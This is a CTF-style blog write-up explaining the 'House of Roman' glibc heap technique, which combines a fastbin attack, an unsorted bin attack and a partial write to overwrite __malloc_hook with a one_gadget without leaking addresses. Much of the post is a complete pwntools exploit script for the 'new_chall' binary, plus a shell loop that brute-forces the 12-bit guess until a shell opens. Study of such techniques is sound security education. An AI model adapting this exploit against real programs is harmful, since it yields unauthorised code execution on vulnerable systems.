---
title: House-of-Roman
date: 2019-03-02 22:17:25
tags: pwn heap
layout: post
---
House of Roman

<!--more-->

# start
House of Roman
主要是利用了 &main_arena+0x58 和一些 one_gadget位置接近只要partial write 就可以不需要leak.
* UAF
* control size(any_size_malloc ||off by one || overflow)
* no leak

mainly:
fast bin atk
unsorted bin atk
partial write

从经典的一个题目讲起

[new_chall][1]

#  Analysis
* Noleak
* malloc 任意大小chunk
* 可以覆盖next_chunk_size
```arm
read(0, heap_ptrs[v1], v2 + 1);
```
* UAF
```arm
if ( v0 <= 19 )
    free(heap_ptrs[v0]);
```

# 思路
* fastbin atk to control malloc_hook
* unsorted bin to make malloc_hook=&main_arena+0x58
* partial write malloc_hook to one_gadget
* use printerr to make esp+0x50=0 to get shell
# EXP
```python
from pwn import *
#context.log_level="debug"
def cmd(c):
	p.sendlineafter("3. Free\n",str(c))
def malloc(size,idx):
	cmd(1)
	p.sendlineafter("Enter size of chunk :",str(size))
	p.sendlineafter("Enter index :",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Enter index :",str(idx))
def edit(idx,c):
	cmd(2)
	p.sendlineafter("Enter index of chunk :",str(idx))
	p.sendafter("Enter data :",c)
p=process("./new_chall")

p.readuntil("Enter name :")
p.sendline("nier")
#fastbin atk to control __malloc_hook
malloc(0x140,0)
malloc(0x18,1)#
free(0)
malloc(0x68,2)
malloc(0x68,3)
malloc(0x68,4)
free(3)
free(4)
edit(4,"\x00")
edit(0,"\xed\x1a")
malloc(0x68,6)
malloc(0x68,7)
malloc(0x68,8)#control malloc__hook

#fixfastbin
free(7)
edit(7,p64(0))
#unsorted bin to make malloc_hook=&main_arena+0x58
malloc(0x58,10)
malloc(0x88,11)
malloc(0x88,12)
free(11)
edit(11,p64(0xdeadbeef)+'\x00')
malloc(0x88,13)
#partial write malloc_hook to one_gadget
edit(8,p64(0xdeadbeefdeadbeef)+"AAA"+p64(0xdddddddddddddfdd)+"\xa4\xd2\xaf")
#use printerr to make esp+0x50=0 to get shell
free(12)
free(12)
#over
try:
	p.interactive(">")
except:
	p.close()
```
12bit burp:1/2^12 
```sh
#bin/bash
for i in `seq 1 5000`; do python exp.py; done;
```


[1]:https://github.com/n132/banana/tree/master/Pwn/heap_trick/house%20of%20X/house%20of%20roman